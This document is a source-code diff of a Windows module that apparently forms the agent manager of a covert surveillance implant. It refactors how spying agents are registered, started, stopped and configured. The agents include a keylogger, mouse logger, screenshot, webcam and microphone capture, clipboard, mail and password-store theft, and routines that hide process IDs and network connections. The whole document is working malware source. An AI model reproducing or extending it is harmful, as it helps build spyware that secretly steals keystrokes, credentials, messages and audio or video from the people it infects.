@@ -1,9 +1,13 @@
 #include <windows.h>
+#include <stdio.h>
+#include <config.h>
+#include <rcs/list.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "AM_Core.h"
 #include "LOG.h"
-#include "JSON\JSON.h"
+#include <cJSON/cJSON.h>
+#include "bss.h"
 
 // XXX Definita in HM_IpcModule!!!!
 #define MAX_MSG_LEN 512 // Lunghezza di un messaggio
@@ -21,11 +25,11 @@ typedef struct {
 #define IPC_DEF_PRIORITY 0x10
 #define IPC_HI_PRIORITY  0x100
 	BYTE message[MAX_MSG_LEN];
-} message_struct;
+} IPC_MESSAGE;
 
 
-extern message_struct *IPCServerPeek();
-extern void IPCServerRemove(message_struct *);
+extern IPC_MESSAGE *IPCServerPeek();
+extern void IPCServerRemove(IPC_MESSAGE *);
 extern void IPCServerWrite(DWORD, BYTE *, DWORD);
 extern BOOL IPCServerInit();
 
@@ -51,30 +55,59 @@ extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
 extern void PM_SocialAgentRegister();
 
-typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
-extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
+typedef void (WINAPI *conf_callback_t)(cJSON*, DWORD counter);
+extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);
+
 void AM_SuspendRestart(DWORD);
 
-
-typedef DWORD (__stdcall *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
-typedef DWORD (__stdcall *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (__stdcall *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
-typedef DWORD (__stdcall *PMU_Generic_t) (void); // Prototipo per l'UnRegister
+typedef DWORD (WINAPI *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
+typedef DWORD (WINAPI *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
+typedef DWORD (WINAPI *PMI_Generic_t) (cJSON*); // Prototipo per l'Init
+typedef DWORD (WINAPI *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
+#define AGENT_NAME_LENGTH 32
 
-typedef struct {
-	WCHAR agent_name[32];
+typedef struct _amdispatch {
+	LIST_ENTRY entry;
+	CHAR agent_name[AGENT_NAME_LENGTH];
 	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
 	PMS_Generic_t pStartStop; 
 	PMI_Generic_t pInit; 
 	PMU_Generic_t pUnRegister;
 	BOOL started;
-} AMDispatchStruct;
+} AMDISPATCH, *LPAMDISPATCH;
 
-AMDispatchStruct aDispatchArray[AM_MAXDISPATCH];
-DWORD dwDispatchCnt = 0;
+static LIST_ENTRY aDispatchArray = { &aDispatchArray, &aDispatchArray };
+
+static LPAMDISPATCH AllocateDispatchElement()
+{
+	LPAMDISPATCH dst = alloc_entry<AMDISPATCH>();
+
+	InsertTailList(&aDispatchArray, &dst->entry);
+	return dst;
+}
+
+
+static BOOL compare_by_tag(LPAMDISPATCH entry, DWORD key)
+{
+	return (entry->agent_tag == key);
+}
+
+static BOOL compare_by_name(LPAMDISPATCH entry, LPCSTR lpName)
+{
+	return !stricmp(entry->agent_name, lpName);
+}
+static LPAMDISPATCH GetDispatchByTag(DWORD dwTag)
+{
+	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_tag, dwTag);
+}
+
+static LPAMDISPATCH GetDispatchByName(LPCSTR lpName)
+{
+	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_name, lpName);
+}
 
 ////////////////////////////////////////////////
 // Funzioni e strutture per l'hiding dinamico //
@@ -89,9 +122,9 @@ CRITICAL_SECTION hide_critic_sec;
 DWORD AM_HideElemSize(DWORD type)
 {
 	if (type == HIDE_PID)
-		return sizeof(pid_hide_struct);
+		return sizeof(PID_HIDE);
 	else if (type == HIDE_CNN)
-		return sizeof(connection_hide_struct);
+		return sizeof(CONNECTION_HIDE);
 	else
 		return 0;
 }
@@ -110,8 +143,8 @@ DWORD AM_HideWrapperTag(DWORD type)
 // Ritorna una struttura nulla del tipo relativo
 BYTE *AM_HideNullEntry(DWORD type)
 {
-	static connection_hide_struct connection_hide = NULL_CONNETCION_HIDE_STRUCT;
-	static pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	static CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT;
+	static PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	if (type == HIDE_PID)
 		return (BYTE *)&pid_hide;
@@ -246,38 +279,33 @@ void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
 	IPCServerWrite(dwTag, (BYTE *)&bStartFlag, sizeof(BOOL));
 }
 
-
 // Registra il Monitor con le funzioni di Init, StartStop e Dispatch
 // Viene richiamata dalle funzioni di registrazione dei monitor.
-DWORD AM_MonitorRegister(WCHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+DWORD AM_MonitorRegister(const CHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
 {
-	if(dwDispatchCnt >= AM_MAXDISPATCH)
-		return NULL;
-	swprintf_s(aDispatchArray[dwDispatchCnt].agent_name, sizeof(aDispatchArray[dwDispatchCnt].agent_name)/ sizeof(WCHAR), L"%s", agent_name);
-	aDispatchArray[dwDispatchCnt].agent_tag = agent_tag;
-	aDispatchArray[dwDispatchCnt].pDispatch = (PMD_Generic_t) pDispatch;
-	aDispatchArray[dwDispatchCnt].pStartStop = (PMS_Generic_t) pStartStop;
-	aDispatchArray[dwDispatchCnt].pInit = (PMI_Generic_t) pInit;
-	aDispatchArray[dwDispatchCnt].pUnRegister = (PMU_Generic_t) pUnRegister;
-	aDispatchArray[dwDispatchCnt].started = FALSE;
-	
-	dwDispatchCnt++;
-
+	LPAMDISPATCH dispatchArray = AllocateDispatchElement();
+	if (dispatchArray == NULL) {
+		return 0;
+	}
+	sprintf_s(dispatchArray->agent_name, AGENT_NAME_LENGTH, "%s", agent_name);
+	dispatchArray->agent_tag = agent_tag;
+	dispatchArray->pDispatch = (PMD_Generic_t) pDispatch;
+	dispatchArray->pStartStop = (PMS_Generic_t) pStartStop;
+	dispatchArray->pInit = (PMI_Generic_t) pInit;
+	dispatchArray->pUnRegister = (PMU_Generic_t) pUnRegister;
+	dispatchArray->started = FALSE;
 	return 1;
 }
 
 // Esegue il dispatch per il monitor dwTag
 DWORD AM_Dispatch(DWORD dwTag, BYTE * pMsg, DWORD dwMsgLen, DWORD dwFlags, FILETIME *tstamp)
 {
-	DWORD i;
+	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
+	if (dispatch == NULL)
+		return 0;
 
-	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].agent_tag) {
-			if (aDispatchArray[i].pDispatch)
-				aDispatchArray[i].pDispatch(pMsg, dwMsgLen, dwFlags, tstamp);
-			break;
-		}
-	}
+	if (dispatch->pDispatch != NULL)
+		dispatch->pDispatch(pMsg, dwMsgLen, dwFlags, tstamp);
 	return 1;
 }
 
@@ -287,59 +315,71 @@ DWORD AM_Dispatch(DWORD dwTag, BYTE * pMsg, DWORD dwMsgLen, DWORD dwFlags, FILET
 // FALSE = Stop
 DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 {
-	DWORD i;
+	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
+	if (dispatch == NULL)
+		return 0;
 
-	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].agent_tag) {
-			aDispatchArray[i].started = bStartFlag;
-			if (aDispatchArray[i].pStartStop)
-				aDispatchArray[i].pStartStop(bStartFlag, TRUE);
-			break;
-		}
-	}
+	dispatch->started = bStartFlag;
+	if (dispatch->pStartStop)
+		dispatch->pStartStop(bStartFlag, TRUE);
+
 	return 1;
 }
 
 // Prende il tag di un agente per nome
-DWORD AM_GetAgentTag(const WCHAR *agent_name)
+DWORD AM_GetAgentTag(const CHAR *agent_name)
 {
-	DWORD i;
-	for(i=0; i<dwDispatchCnt; i++) 
-		if(!wcsicmp(agent_name, aDispatchArray[i].agent_name))
-			return aDispatchArray[i].agent_tag;
+	LPAMDISPATCH dispatch = GetDispatchByName(agent_name);
+	if (dispatch != NULL)
+		return dispatch->agent_tag;
+
 	return 0xFFFFFFFF;
 }
 
 // Esegue l'init di un monitor
-DWORD AM_MonitorInit(DWORD dwTag, JSONObject elem)
+DWORD AM_MonitorInit(DWORD dwTag, cJSON* elem)
 {
-	DWORD i;
+	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
+	if (dispatch == NULL)
+		return 0;
 
-	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].agent_tag) {
-			aDispatchArray[i].started = FALSE;
-			if (aDispatchArray[i].pInit)
-				aDispatchArray[i].pInit(elem);
-			break;
-		}
-	}
+	dispatch->started = FALSE;
+	if (dispatch->pInit != NULL)
+		dispatch->pInit(elem);
+
 	return 1;
+}
+
+static void stop_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(FALSE, TRUE);
+}
+
+static void suspend_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(FALSE, FALSE);
+}
+
+static void restart_everything(LPAMDISPATCH entry)
+{
+	if (entry->pStartStop != NULL)
+		entry->pStartStop(TRUE, FALSE);
+}
+
+static void unregister(LPAMDISPATCH entry)
+{
+	if (entry->pUnRegister)
+		entry->pUnRegister();
 }
 
 // Stoppa e Deregistra tutti gli agenti prima dell'uninstall
 DWORD AM_UnRegisterAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, TRUE);
-	}
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pUnRegister)
-			aDispatchArray[i].pUnRegister();
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
+	apply_in_list<AMDISPATCH> (&aDispatchArray, unregister);
+	remove_all<AMDISPATCH>(&aDispatchArray, free);
 	return 1;
 }
 
@@ -349,40 +389,24 @@ DWORD AM_UnRegisterAll()
 // o come action di un evento o con la ResartAll
 DWORD AM_MonitorSuspendAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, FALSE);
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, suspend_everything);
 	return 1;
 }
 
 DWORD AM_MonitorStopAll()
 {
-	DWORD i;
-
-	for(i=0; i<dwDispatchCnt; i++) {
-		aDispatchArray[i].started = FALSE;
-		if (aDispatchArray[i].pStartStop)
-			aDispatchArray[i].pStartStop(FALSE, TRUE);
-	}
+	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
 	return 1;
 }
 
 // Rimette gli agent nello stato in cui erano al momento
 // della SuspendAll (usato quando c'e' una sync e uno scambio
 // di code dei log).
+// Li riavvia in ordine inverso allo stop
+// Gli ultimi agenti registrati rimangono stoppati per meno tempo
 DWORD AM_MonitorRestartAll()
 {
-	int i;
-
-	// Li riavvia in ordine inverso allo stop
-	// Gli ultimi agenti registrati rimangono stoppati per meno tempo
-	for(i=dwDispatchCnt-1; i>=0; i--) {
-		if (aDispatchArray[i].pStartStop && aDispatchArray[i].started)
-			aDispatchArray[i].pStartStop(TRUE, FALSE);
-	}
+	reverse_apply_in_list<AMDISPATCH>(&aDispatchArray, restart_everything);
 	return 1;
 
 }
@@ -393,7 +417,7 @@ BOOL bAM_cp = FALSE; // Semaforo per uscita thread AgentManager
 
 DWORD AM_Main()
 {	
-	message_struct *msMsg;
+	IPC_MESSAGE* msMsg = NULL;
 
 	LOOP {		
 		CANCELLATION_POINT(bAM_cp);
@@ -410,23 +434,40 @@ DWORD AM_Main()
 
 void InitAgents()
 {
+#ifdef __ENABLE_PROCMON_MODULE
 	PM_FileAgentRegister();
-	PM_KeyLogRegister();
+#endif
+
+#ifdef __ENABLE_SCREENSHOT_MODULE
 	PM_SnapShotRegister();
+#endif
 	PM_WiFiLocationRegister();
 	//PM_PrintAgentRegister();
+#ifdef __ENABLE_CRISIS_MODULE
 	PM_CrisisAgentRegister();
+#endif
 	PM_UrlLogRegister();
 	PM_ClipBoardRegister();
 	PM_WebCamRegister();
 	PM_MailCapRegister();
 	PM_PStoreAgentRegister();
+#ifdef __ENABLE_IMAGENT_MODULE
 	PM_IMRegister();
+#endif
 	PM_DeviceInfoRegister();
+#ifdef __ENABLE_MONEY_MODULE
 	PM_MoneyRegister();
+#endif
+#if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
+	PM_KeyLogRegister();
 	PM_MouseLogRegister();
+#endif
+#ifdef __ENABLE_APPLICATION_MODULE
 	PM_ApplicationRegister();
+#endif
+#ifdef __ENABLE_PDAGENT_MODULE
 	PM_PDAAgentRegister();
+#endif
 	PM_ContactsRegister();
 	PM_AmbMicRegister();
 	PM_SocialAgentRegister();
@@ -450,19 +491,20 @@ DWORD AM_Startup()
 
 
 // Legge la configurazione degli agent da file
-void WINAPI ParseModules(JSONObject module, DWORD dummy)
+void WINAPI ParseModules(cJSON *root, DWORD dummy)
 {
-	AM_MonitorInit(AM_GetAgentTag(module[L"module"]->AsString().c_str()), module);	
+	cJSON* module = cJSON_GetObjectItem(root, "module");
+	const char* value = cJSON_GetStringValue(module);
+	AM_MonitorInit(AM_GetAgentTag(value), module);	
 }
 
 void UpdateAgentConf()
 {
-	JSONObject dummy;
-	char *conf_json = HM_ReadClearConf(H4_CONF_FILE);
+	char *conf_json = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_json) {
-		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
+		HM_ParseConfSection(conf_json, "modules", &ParseModules);
 		// Inizializza l'agente "fantasma" social
-		AM_MonitorInit(AM_GetAgentTag(L"social"), dummy);
+		AM_MonitorInit(AM_GetAgentTag("social"), NULL);
 	}
 	SAFE_FREE(conf_json);
 }
